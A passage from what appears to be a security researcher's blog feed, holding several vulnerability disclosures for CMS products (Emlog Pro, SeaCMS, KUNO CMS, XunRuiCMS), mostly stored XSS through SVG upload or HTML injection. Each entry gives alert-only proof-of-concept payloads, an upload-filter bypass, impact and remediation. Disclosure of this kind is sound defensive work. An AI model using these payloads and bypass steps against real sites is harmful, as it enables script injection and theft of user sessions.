src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-22%20105155.png" alt="Image Management Interface"></p><h2 id="Proof-of-Concept-PoC"><a href="#Proof-of-Concept-PoC" class="headerlink" title="Proof of Concept (PoC)"></a>Proof of Concept (PoC)</h2><p>After accessing the image management module, I selected the edit option which revealed a file upload functionality:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-22%20105444.png" alt="File Upload Interface"></p><p>I created a malicious SVG file with the following content:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(&#x27;XSS测试&#x27;)&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure><p>The file was successfully uploaded without any content validation or sanitization:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-22%20105605.png" alt="Successful Upload Confirmation"></p><p>When viewing the uploaded file, the JavaScript code embedded in the SVG was automatically executed in the browser context:</p><p><img src="/img/image-20250822105730183.png" alt="XSS Execution Proof"></p><p>After clicking the “Save” button, the malicious SVG file was permanently stored in the system, resulting in a stored XSS vulnerability that affects both front-end users and administrators.</p><h2 id="Vulnerable-Code-Analysis"><a href="#Vulnerable-Code-Analysis" class="headerlink" title="Vulnerable Code Analysis"></a>Vulnerable Code Analysis</h2><p>The vulnerability exists in the image management module’s file upload handling, which fails to:</p><ol><li>Properly validate the content of SVG files before accepting them</li><li>Sanitize potentially dangerous elements and attributes in SVG files</li><li>Implement proper MIME type restrictions for uploaded files</li><li>Convert SVG files to safer image formats before storing them</li></ol><p>The core issue is that the image management module allows SVG files to be uploaded and later served with the correct MIME type that enables JavaScript execution within the browser.</p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>This vulnerability allows attackers with administrative access to:</p><ol><li>Execute arbitrary JavaScript code in the context of other users’ browsers, including administrators and front-end users</li><li>Steal sensitive information such as session cookies and authentication tokens</li><li>Perform unauthorized actions on behalf of victims</li><li>Potentially escalate to more severe attacks by chaining with other vulnerabilities</li></ol><p>As confirmed in testing, the impact extends to both front-end and back-end users, creating a significant security risk for all site visitors.</p><h2 id="Remediation"><a href="#Remediation" class="headerlink" title="Remediation"></a>Remediation</h2><p>To fix this vulnerability, the application should implement the following security measures:</p><ol><li>Enhance the image management module to perform content validation and sanitization of SVG files</li><li>Strip potentially dangerous elements and attributes from SVG files</li><li>Consider converting SVG files to raster image formats (PNG, JPEG) during the upload process</li><li>Implement proper Content Security Policy (CSP) headers to prevent script execution from uploaded files</li><li>Serve SVG files with a MIME type that prevents script execution (e.g., <code>image/svg+xml-sanitized</code>)</li></ol><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul><li><strong>2025-08-22</strong>: Vulnerability discovered</li><li><strong>2025-08-22</strong>: Documentation and proof of concept created</li><li><strong>[Future Date]</strong>: Vulnerability reported to vendor</li><li><strong>[Future Date]</strong>: CVE assigned</li></ul>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞挖掘</tag>
      
      <tag>CVE</tag>
      
      <tag>XSS</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Information Disclosure and Source Code Leakage Vulnerability in SeaCMS</title>
    <link href="/2025/08/21/Information-Disclosure-Vulnerability-in-SeaCMS/"/>
    <url>/2025/08/21/Information-Disclosure-Vulnerability-in-SeaCMS/</url>
    
    <content type="html"><![CDATA[<h1 id="Information-Disclosure-and-Source-Code-Leakage-Vulnerability-in-SeaCMS"><a href="#Information-Disclosure-and-Source-Code-Leakage-Vulnerability-in-SeaCMS" class="headerlink" title="Information Disclosure and Source Code Leakage Vulnerability in SeaCMS"></a>Information Disclosure and Source Code Leakage Vulnerability in SeaCMS</h1><h2 id="Vulnerability-Description"><a href="#Vulnerability-Description" class="headerlink" title="Vulnerability Description"></a>Vulnerability Description</h2><p>A critical information disclosure vulnerability has been discovered in SeaCMS version 13.1. The vulnerability exists in the <code>admin_safe.php</code> component located in the <code>/btcoan/</code> directory. This security flaw allows authenticated administrators to scan and download not only the application’s source code but also potentially any file accessible on the server’s root directory.</p><h2 id="Affected-Product"><a href="#Affected-Product" class="headerlink" title="Affected Product"></a>Affected Product</h2><ul><li><strong>Product</strong>: SeaCMS</li><li><strong>Version</strong>: 13.1</li><li><strong>Component</strong>: Security Scanning Module (<code>/btcoan/admin_safe.php</code>)</li><li><strong>CWE</strong>: CWE-200: Exposure of Sensitive Information to an Unauthorized Actor</li></ul><h2 id="Technical-Details"><a href="#Technical-Details" class="headerlink" title="Technical Details"></a>Technical Details</h2><p>I deployed SeaCMS 13.1 locally using PHPStudy with the access URL <a href="http://seacms.local/btcoan/#">http://seacms.local/btcoan/#</a>. The source code is available at: <a href="https://github.com/seacms-net/CMS">https://github.com/seacms-net/CMS</a></p><p>During security analysis of the administrative interface, I discovered that the security scanning component (<code>admin_safe.php</code>) intended to identify potentially vulnerable files actually exposes the full file content and allows direct download of source code files.</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-21%20163737.png" alt="Security Scanning Interface"></p><h2 id="Proof-of-Concept-PoC"><a href="#Proof-of-Concept-PoC" class="headerlink" title="Proof of Concept (PoC)"></a>Proof of Concept (PoC)</h2><p>After accessing the admin panel and navigating to the security scanning module, I clicked on “Start Scanning” and observed that the system not only identified files but also provided direct download links to their source code:</p><p><img src="/img/image-20250821164151353.png" alt="Source Code Download Options"></p><p>This functionality results in complete exposure of the application’s source code:</p><p><img src="/img/image-20250821164227307.png" alt="Source Code Exposure"></p><p>More critically, the scanning functionality is not properly confined to the application directory. It can traverse and expose files from the entire server root directory, including other applications and potentially sensitive files:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-21%20164410.png" alt="Directory Traversal and Server-wide Access"></p><p>As demonstrated in the testing environment, this vulnerability allows access to all files within the PHPStudy installation directory, enabling the download of source code from any application hosted on the same server.</p><h2 id="Vulnerable-Code-Analysis"><a href="#Vulnerable-Code-Analysis" class="headerlink" title="Vulnerable Code Analysis"></a>Vulnerable Code Analysis</h2><p>The vulnerability exists in the security scanning component (<code>admin_safe.php</code>), which fails to:</p><ol><li>Properly restrict file access to the application’s directory</li><li>Implement authorization checks for file downloads</li><li>Sanitize file paths to prevent directory traversal</li><li>Restrict access to sensitive application files and configurations</li></ol><p>The core issue appears to be that the security scanning feature, intended to identify security issues, itself becomes a security liability by exposing source code and enabling unrestricted access to server files.</p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>This vulnerability allows attackers with administrative access to:</p><ol><li>Download the entire application source code, exposing business logic, security mechanisms, and potential hardcoded credentials</li><li>Access configuration files that might contain database credentials, API keys, and other sensitive information</li><li>Access files from other applications hosted on the same server</li><li>Gain insights that could facilitate further attacks by understanding the application’s security mechanisms</li></ol><p>While this vulnerability requires administrative access to exploit, it represents a critical security issue as it completely compromises the confidentiality of the application’s source code and potentially exposes other sensitive server information.</p><h2 id="Remediation"><a href="#Remediation" class="headerlink" title="Remediation"></a>Remediation</h2><p>To fix this vulnerability, the application should:</p><ol><li>Restrict file scanning to only display metadata (file names, sizes, permissions) without providing content access</li><li>Implement proper directory isolation to prevent access to files outside the application’s directory</li><li>Add additional authorization checks for security scanning features</li><li>Add logging and monitoring for sensitive administrative operations</li><li>Consider removing or significantly restricting the file download capability from the security scanning module</li></ol><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul><li><strong>2025-08-21</strong>: Vulnerability discovered</li><li><strong>2025-08-21</strong>: Documentation and proof of concept created</li><li><strong>[Future Date]</strong>: Vulnerability reported to vendor</li><li><strong>[Future Date]</strong>: CVE assigned</li></ul>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Information Disclosure</tag>
      
      <tag>漏洞挖掘</tag>
      
      <tag>Source Code Leakage</tag>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Stored XSS Vulnerability in Emlog Pro via SVG File Upload</title>
    <link href="/2025/08/21/SVG-File-Upload-XSS-Vulnerability-in-Emlog-Pro/"/>
    <url>/2025/08/21/SVG-File-Upload-XSS-Vulnerability-in-Emlog-Pro/</url>
    
    <content type="html"><![CDATA[<h1 id="Stored-XSS-Vulnerability-in-Emlog-Pro-via-SVG-File-Upload"><a href="#Stored-XSS-Vulnerability-in-Emlog-Pro-via-SVG-File-Upload" class="headerlink" title="Stored XSS Vulnerability in Emlog Pro via SVG File Upload"></a>Stored XSS Vulnerability in Emlog Pro via SVG File Upload</h1><h2 id="Vulnerability-Description"><a href="#Vulnerability-Description" class="headerlink" title="Vulnerability Description"></a>Vulnerability Description</h2><p>A stored Cross-Site Scripting (XSS) vulnerability has been discovered in Emlog Pro 2.5.19. The vulnerability exists due to insufficient validation of SVG file uploads in the <code>/admin/media.php</code> component, allowing attackers to upload malicious SVG files containing JavaScript code that executes when the uploaded file is viewed.</p><h2 id="Affected-Product"><a href="#Affected-Product" class="headerlink" title="Affected Product"></a>Affected Product</h2><ul><li><strong>Product</strong>: Emlog Pro</li><li><strong>Version</strong>: 2.5.19</li><li><strong>Component</strong>: Media Upload Functionality (<code>/admin/media.php</code>)</li><li><strong>CWE</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</li></ul><h2 id="Technical-Details"><a href="#Technical-Details" class="headerlink" title="Technical Details"></a>Technical Details</h2><p>I deployed the latest version of Emlog Pro 2.5.19 locally using PHPStudy. The source code is available at: <a href="https://www.emlog.net/download">https://www.emlog.net/download</a></p><p>During security analysis of the administrative interface, I discovered that the media upload component allows SVG files to be uploaded without proper validation or sanitization. This creates a vector for stored XSS attacks through malicious SVG content.</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-21%20155306.png" alt="Media Upload Interface"></p><h2 id="Proof-of-Concept-PoC"><a href="#Proof-of-Concept-PoC" class="headerlink" title="Proof of Concept (PoC)"></a>Proof of Concept (PoC)</h2><p>After identifying the vulnerability in the media upload component, I created a malicious SVG file with the following content:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(&#x27;XSS测试&#x27;)&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure><p>The SVG file was successfully uploaded without any security checks:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-21%20155546.png" alt="Successful Upload Confirmation"></p><p>When accessing the uploaded SVG file URL, the JavaScript code is executed in the browser context:</p><p><img src="/img/image-20250821155704544.png" alt="XSS Execution Proof"></p><h2 id="Vulnerable-Code-Analysis"><a href="#Vulnerable-Code-Analysis" class="headerlink" title="Vulnerable Code Analysis"></a>Vulnerable Code Analysis</h2><p>The vulnerability exists in the media upload component, which fails to properly validate and sanitize SVG file uploads before storing them on the server. The application has several critical security issues:</p><ol><li>No content validation for SVG files</li><li>No sanitization of potentially dangerous SVG elements and attributes</li><li>SVG files are served with the correct MIME type that allows JavaScript execution</li><li>Absence of Content Security Policy (CSP) to restrict script execution in uploaded media</li></ol><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>This vulnerability allows attackers with administrative access to:</p><ol><li>Execute arbitrary JavaScript code in the context of other users’ browsers</li><li>Steal sensitive information such as session cookies and authentication tokens</li><li>Perform actions on behalf of the victim</li><li>Potentially escalate to more severe attacks if combined with other vulnerabilities</li></ol><p>While this vulnerability requires administrative access to exploit, it can be used as part of a chain attack where a lower-privileged user gains administrative access and then leverages this vulnerability to maintain persistence or escalate privileges further.</p><h2 id="Remediation"><a href="#Remediation" class="headerlink" title="Remediation"></a>Remediation</h2><p>To fix this vulnerability, the application should:</p><ol><li>Implement proper validation and sanitization of SVG files</li><li>Strip potentially dangerous elements and attributes from SVG files</li><li>Consider converting SVG files to other image formats (like PNG) during upload</li><li>Implement a Content Security Policy (CSP) to prevent execution of inline scripts</li><li>Serve uploaded SVG files with a MIME type that prevents script execution</li></ol><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul><li><strong>2025-08-21</strong>: Vulnerability discovered</li><li><strong>2025-08-21</strong>: Documentation and proof of concept created</li><li><strong>[Future Date]</strong>: Vulnerability reported to vendor</li><li><strong>[Future Date]</strong>: CVE assigned</li></ul>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞挖掘</tag>
      
      <tag>CVE</tag>
      
      <tag>XSS</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Stored XSS Vulnerability in Emlog Pro via HTML Injection</title>
    <link href="/2025/08/21/Stored-XSS-Vulnerability-in-Emlog-Pro-HTML-Injection/"/>
    <url>/2025/08/21/Stored-XSS-Vulnerability-in-Emlog-Pro-HTML-Injection/</url>
    
    <content type="html"><![CDATA[<h1 id="Stored-XSS-Vulnerability-in-Emlog-Pro-via-HTML-Injection"><a href="#Stored-XSS-Vulnerability-in-Emlog-Pro-via-HTML-Injection" class="headerlink" title="Stored XSS Vulnerability in Emlog Pro via HTML Injection"></a>Stored XSS Vulnerability in Emlog Pro via HTML Injection</h1><h2 id="Vulnerability-Description"><a href="#Vulnerability-Description" class="headerlink" title="Vulnerability Description"></a>Vulnerability Description</h2><p>A stored Cross-Site Scripting (XSS) vulnerability has been discovered in Emlog Pro 2.5.19. The vulnerability exists in the email template configuration component located at <code>/admin/setting.php?action=mail</code>, which allows administrators to input HTML code that is not properly sanitized, leading to persistent JavaScript execution.</p><h2 id="Affected-Product"><a href="#Affected-Product" class="headerlink" title="Affected Product"></a>Affected Product</h2><ul><li><strong>Product</strong>: Emlog Pro</li><li><strong>Version</strong>: 2.5.19</li><li><strong>Component</strong>: Email Template Configuration (<code>/admin/setting.php?action=mail</code>)</li><li><strong>CWE</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</li></ul><h2 id="Technical-Details"><a href="#Technical-Details" class="headerlink" title="Technical Details"></a>Technical Details</h2><p>I deployed the latest version of Emlog Pro 2.5.19 locally using PHPStudy. The source code is available at: <a href="https://www.emlog.net/download">https://www.emlog.net/download</a></p><p>During security analysis of the administrative interface, I discovered that the email template configuration page allows direct HTML input without proper sanitization or validation. This creates an entry point for stored XSS attacks.</p><p><img src="/img/image-20250821160121933.png" alt="Email Template Configuration Interface"></p><h2 id="Proof-of-Concept-PoC"><a href="#Proof-of-Concept-PoC" class="headerlink" title="Proof of Concept (PoC)"></a>Proof of Concept (PoC)</h2><p>After identifying the vulnerability in the email template component, I injected the following malicious HTML code:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Upon insertion of this code, the JavaScript is immediately executed in the browser:</p><p><img src="/img/image-20250821160253388.png" alt="XSS Execution Proof"></p><p>After saving the settings, the malicious code is stored in the database:</p><p><img src="/img/image-20250821160413692.png" alt="Saving Malicious Configuration"></p><p>Subsequently, every time the email template configuration page is accessed, the XSS payload is automatically triggered:</p><p><img src="/img/image-20250821160455751.png" alt="Persistent XSS Execution"></p><h2 id="Vulnerable-Code-Analysis"><a href="#Vulnerable-Code-Analysis" class="headerlink" title="Vulnerable Code Analysis"></a>Vulnerable Code Analysis</h2><p>The vulnerability exists in the email template configuration component, which fails to properly sanitize user-supplied HTML input before storing it in the database and rendering it back to users. The application has several critical security issues:</p><ol><li>No input validation for HTML content in the email template field</li><li>No sanitization of potentially dangerous HTML attributes and event handlers</li><li>Absence of Content Security Policy (CSP) to restrict script execution</li><li>Direct storage and rendering of user-supplied HTML without encoding</li></ol><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>This vulnerability allows attackers with administrative access to:</p><ol><li>Execute arbitrary JavaScript code in the context of other administrators’ browsers</li><li>Steal sensitive information such as session cookies and authentication tokens</li><li>Perform unauthorized actions on behalf of victim administrators</li><li>Potentially escalate to more severe attacks or system compromise</li></ol><p>While this vulnerability requires administrative access to exploit, it can be used as part of a chain attack where a lower-privileged user gains administrative access and then leverages this vulnerability to maintain persistence or escalate privileges further.</p><h2 id="Remediation"><a href="#Remediation" class="headerlink" title="Remediation"></a>Remediation</h2><p>To fix this vulnerability, the application should:</p><ol><li>Implement proper HTML sanitization for the email template input</li><li>Strip or encode potentially dangerous HTML attributes and event handlers</li><li>Implement a Content Security Policy (CSP) to prevent execution of inline scripts</li><li>Consider using a template system that automatically escapes HTML content</li><li>Validate user input against a whitelist of allowed HTML tags and attributes</li></ol><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul><li><strong>2025-08-21</strong>: Vulnerability discovered</li><li><strong>2025-08-21</strong>: Documentation and proof of concept created</li><li><strong>[Future Date]</strong>: Vulnerability reported to vendor</li><li><strong>[Future Date]</strong>: CVE assigned</li></ul>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞挖掘</tag>
      
      <tag>CVE</tag>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>KUNO CMS - Stored XSS via SVG File Upload Vulnerability</title>
    <link href="/2025/08/19/KUNO-File-Upload-XSS-Vulnerability/"/>
    <url>/2025/08/19/KUNO-File-Upload-XSS-Vulnerability/</url>
    
    <content type="html"><![CDATA[<h1 id="KUNO-CMS-Stored-XSS-via-SVG-File-Upload-Vulnerability"><a href="#KUNO-CMS-Stored-XSS-via-SVG-File-Upload-Vulnerability" class="headerlink" title="KUNO CMS - Stored XSS via SVG File Upload Vulnerability"></a>KUNO CMS - Stored XSS via SVG File Upload Vulnerability</h1><h2 id="Vulnerability-Description"><a href="#Vulnerability-Description" class="headerlink" title="Vulnerability Description"></a>Vulnerability Description</h2><p>A stored Cross-Site Scripting (XSS) vulnerability has been discovered in KUNO CMS (2025 latest version). The vulnerability exists due to insufficient validation of file uploads in the <code>backend/internal/api/media.go</code> component, allowing attackers to upload SVG files containing malicious JavaScript code that executes when the uploaded file is viewed.</p><h2 id="Affected-Product"><a href="#Affected-Product" class="headerlink" title="Affected Product"></a>Affected Product</h2><ul><li><strong>Product</strong>: KUNO CMS</li><li><strong>Version</strong>: 2025 Latest Version</li><li><strong>Component</strong>: <code>backend/internal/api/media.go</code> (File Upload Functionality)</li><li><strong>CWE</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</li></ul><h2 id="Technical-Details"><a href="#Technical-Details" class="headerlink" title="Technical Details"></a>Technical Details</h2><p>I deployed KUNO CMS locally using Docker with the following method:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. Create a dedicated directory (recommended to use /opt)</span><br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> -p /opt/kuno<br><span class="hljs-built_in">cd</span> /opt/kuno<br><br><span class="hljs-comment"># 2. Download and execute the deployment script</span><br>curl -sSL <span class="hljs-string">&quot;https://raw.githubusercontent.com/xuemian168/kuno/main/deploy-from-hub.sh?<span class="hljs-subst">$(date +%s)</span>&quot;</span> -o deploy.sh &amp;&amp; <span class="hljs-built_in">chmod</span> +x deploy.sh &amp;&amp; <span class="hljs-built_in">sudo</span> ./deploy.sh<br></code></pre></td></tr></table></figure><p>The source code is available at: <a href="https://github.com/xuemian168/kuno">https://github.com/xuemian168/kuno</a></p><p>During code analysis of the <code>backend/internal/api/media.go</code> component, I discovered several security issues:</p><ul><li>File type validation is based solely on Content-Type headers, which can be easily bypassed</li><li>No analysis of file contents is performed</li><li>No whitelist of allowed file extensions is implemented</li></ul><p><img src="/img/image-20250819112357386.png" alt="Code Analysis"></p><h2 id="Proof-of-Concept-PoC"><a href="#Proof-of-Concept-PoC" class="headerlink" title="Proof of Concept (PoC)"></a>Proof of Concept (PoC)</h2><p>After identifying the vulnerability in the frontend interface:</p><p><img src="/img/image-20250819112547737.png" alt="Upload Interface"></p><p>I created a malicious SVG file with the following content:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(&#x27;XSS Test&#x27;)&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure><p>The attack methodology involved:</p><ol><li>Saving the SVG code as a PNG file to bypass frontend validation</li><li>Intercepting the upload request with a proxy tool</li><li>Modifying the file extension from PNG to SVG before sending the request</li></ol><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-19%20103042.png" alt="Request Interception"></p><ol start="4"><li>Changing the file extension to SVG in the request</li></ol><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-19%20103001.png" alt="Modified Request"></p><ol start="5"><li>When accessing the uploaded file URL, the JavaScript code is executed in the browser:</li></ol><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-19%20102939.png" alt="XSS Execution"></p><h2 id="Vulnerable-Code-Analysis"><a href="#Vulnerable-Code-Analysis" class="headerlink" title="Vulnerable Code Analysis"></a>Vulnerable Code Analysis</h2><p>The vulnerability exists in the <code>backend/internal/api/media.go</code> component, which fails to properly validate uploaded files. The component has several critical security issues:</p><ol><li>It only checks the Content-Type header, which can be easily spoofed</li><li>It does not perform content analysis to detect potentially malicious code in SVG files</li><li>It lacks a proper file extension whitelist</li><li>It does not sanitize SVG content before accepting the upload</li></ol><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>This vulnerability allows attackers to:</p><ol><li>Execute arbitrary JavaScript code in the context of other users’ browsers</li><li>Steal sensitive information such as session cookies</li><li>Perform actions on behalf of the victim</li><li>Potentially escalate to more severe attacks</li></ol><h2 id="Remediation"><a href="#Remediation" class="headerlink" title="Remediation"></a>Remediation</h2><p>To fix this vulnerability, the application should:</p><ol><li>Implement proper validation and sanitization of SVG files in the <code>media.go</code> component</li><li>Perform content analysis to detect potentially malicious code</li><li>Establish a whitelist of allowed file extensions</li><li>Consider using a Content Security Policy (CSP) to prevent execution of inline scripts</li><li>Convert SVG files to other image formats (like PNG) during the upload process</li><li>Apply SVG-specific sanitization to remove potentially dangerous attributes and elements</li></ol><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul><li><strong>2025-08-19</strong>: Vulnerability discovered</li><li><strong>2025-08-19</strong>: Documentation and proof of concept created</li><li><strong>[Future Date]</strong>: Vulnerability reported to vendor</li><li><strong>[Future Date]</strong>: CVE assigned</li></ul>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞挖掘</tag>
      
      <tag>CVE</tag>
      
      <tag>XSS</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XunRuiCMS v4.7.1 - Stored XSS via SVG File Upload</title>
    <link href="/2025/08/18/File-Upload-to-Achieve-Stored-XSS-Attack/"/>
    <url>/2025/08/18/File-Upload-to-Achieve-Stored-XSS-Attack/</url>
    
    <content type="html"><![CDATA[<h1 id="XunRuiCMS-v4-7-1-Stored-XSS-via-SVG-File-Upload"><a href="#XunRuiCMS-v4-7-1-Stored-XSS-via-SVG-File-Upload" class="headerlink" title="XunRuiCMS v4.7.1 - Stored XSS via SVG File Upload"></a>XunRuiCMS v4.7.1 - Stored XSS via SVG File Upload</h1><h2 id="Vulnerability-Description"><a href="#Vulnerability-Description" class="headerlink" title="Vulnerability Description"></a>Vulnerability Description</h2><p>A stored Cross-Site Scripting (XSS) vulnerability has been discovered in XunRuiCMS version 4.7.1. The vulnerability exists due to insufficient validation of SVG file uploads in the <code>dayrui/Fcms/Library/Upload.php</code> component, allowing attackers to inject malicious JavaScript code that executes when the uploaded file is viewed.</p><h2 id="Affected-Product"><a href="#Affected-Product" class="headerlink" title="Affected Product"></a>Affected Product</h2><ul><li><strong>Product</strong>: XunRuiCMS</li><li><strong>Version</strong>: 4.7.1</li><li><strong>Component</strong>: <code>dayrui/Fcms/Library/Upload.php</code> (File Upload Functionality)</li><li><strong>CWE</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</li></ul><h2 id="Technical-Details"><a href="#Technical-Details" class="headerlink" title="Technical Details"></a>Technical Details</h2><p>I built XunRuiCMS locally using the source code from GitHub. Here is the source code address:</p><p><a href="https://github.com/dayrui/xunruicms">https://github.com/dayrui/xunruicms</a></p><p>This is the latest XunRuiCMS v4.7.1 version, which I deployed locally using PHPStudy at <a href="http://xunrui.local/admin0d8821d43d68.php">http://xunrui.local/admin0d8821d43d68.php</a></p><p><img src="/img/image-20250818144106220.png" alt="CMS Login Page"></p><p>During code analysis, I discovered that the application’s upload component (<code>dayrui/Fcms/Library/Upload.php</code>) allows SVG image uploads. While the system filters out the <code>&lt;script&gt;</code> tag, it does not properly sanitize other potential XSS vectors within SVG files, such as event handlers like <code>onerror</code>.</p><p><img src="/img/image-20250818144236219.png" alt="Code Filtering"></p><p>The vulnerability occurs because the upload validation routine only checks for explicit <code>&lt;script&gt;</code> tags but fails to validate other JavaScript execution vectors commonly found in SVG files, such as event handlers and embedded JavaScript URIs.</p><h2 id="Proof-of-Concept-PoC"><a href="#Proof-of-Concept-PoC" class="headerlink" title="Proof of Concept (PoC)"></a>Proof of Concept (PoC)</h2><p>The following SVG code can be used to bypass the filtering mechanism in the Upload.php component:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(&#x27;XSS Test&#x27;)&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Save the code above as an SVG image file:</p><p><img src="/img/image-20250818144602694.png" alt="SVG File"></p><p>The vulnerability can be exploited through the image upload functionality:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-18%20144753.png" alt="Vulnerability Point"></p><p>After uploading the malicious SVG file, it is successfully stored on the server:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-18%20142903.png" alt="Upload Success"></p><p>The uploaded image can also be seen in the local project:</p><p><img src="/img/image-20250818144939626.png" alt="Image in Project"></p><p>When accessing the uploaded SVG file, the JavaScript code is executed in the victim’s browser:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-18%20142851.png" alt="XSS Execution"></p><h2 